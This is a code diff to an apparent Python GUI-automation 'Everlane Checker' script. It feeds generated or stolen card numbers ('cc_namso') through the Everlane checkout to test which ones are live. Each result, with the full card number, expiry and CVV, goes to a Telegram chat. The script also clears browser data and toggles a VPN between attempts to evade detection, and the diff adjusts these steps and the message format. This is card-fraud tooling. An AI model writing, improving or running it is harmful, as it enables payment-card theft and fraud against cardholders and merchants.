@@ -53,7 +53,10 @@ def preparar_worksplace():
         id = generar_identidad()
 
         bot.locate('enter_email', check=True, click=False)
-        bot.locate('email_address')
+        
+        email = bot.get_position('enter_email')
+        bot.move(email[0]+151, email[1]+110, click=True)
+        bot.press_both('ctrl', 'a')
         bot.copypaste(id[2])
         bot.locate('continue_to_shipping') or bot.press('enter')
         bot.scroll(-200)
@@ -191,7 +194,7 @@ def livear(cc_namso, current, total):
 
         if bot.locate('thanks', click=False) or bot.locate('live', click=False) or bot.locate('survey', click=False):
             print(f'CC: {cc} - Live!')
-            telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: LIVE! ✅\n\nCurrent: {current}/{total}\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2]}\nCVV: {cc[3]}", '-726102881')
+            telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: LIVE! ✅\n\n 📍Current: {current}/{total} 🔍\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2][2:4]} CVV: {cc[3]}\n\n📝 Details:\nSuccess", '-726102881')
             bot.press_both('ctrl', 'l')
             bot.copypaste('chrome://settings/clearBrowserData')
             bot.press('enter')
@@ -204,22 +207,22 @@ def livear(cc_namso, current, total):
 
         elif bot.locate('error1', click=False):
             print('There was a problem processing your card. Please call your card issuer or try a different card.')
-            telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: FAIL! ❌\n\nCurrent: {current}/{total}\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2]} CVV: {cc[3]}\n\n📝 Details:\nThere was a problem processing your card. Please call your card issuer or try a different card.", '-726102881')
+            telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: FAIL! ❌\n\n📍 Current: {current}/{total} 🔍\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2][2:4]} CVV: {cc[3]}\n\n📝 Details:\nThere was a problem processing your card. Please call your card issuer or try a different card.", '-726102881')
             break
 
         elif bot.locate('out_funds', click=False):
             print('Your card appears to be out of funds. Please try a new one.')
-            telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: FAIL! ❌\n\nCurrent: {current}/{total}\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2]} CVV: {cc[3]}\n\n📝 Details:\nYour card appears to be out of funds. Please try a new one.", '-726102881')
+            telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: FAIL! ❌\n\n📍 Current: {current}/{total} 🔍\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2][2:4]} CVV: {cc[3]}\n\n📝 Details:\nYour card appears to be out of funds. Please try a new one.", '-726102881')
             break
 
         elif bot.locate('unable_to_add', click=False):
             print("Unable to add payment method. Please try again.")
-            telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: FAIL! ❌\n\nCurrent: {current}/{total}\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2]} CVV: {cc[3]}\n\n📝 Details:\nUnable to add payment method. Please try again.", '-726102881')
+            telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: FAIL! ❌\n\n📍 Current: {current}/{total} 🔍\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2][2:4]} CVV: {cc[3]}\n\n📝 Details:\nUnable to add payment method. Please try again.", '-726102881')
         
             bot.locate('urban_logo')
-            bot.locate('urban_connected', check=True, click=False)
             bot.locate('urban_turn_off')
             bot.locate('urban_turn_on', wait=0.5)
+            bot.locate('urban_connected', check=True, click=False)
 
             preparar_worksplace()
             break
@@ -245,7 +248,8 @@ def main():
 if __name__ == '__main__':
 
     try: 
-        main()
+        # main()
+        print(bot.get_position('enter_email'))
 
     except KeyboardInterrupt:
         exit()
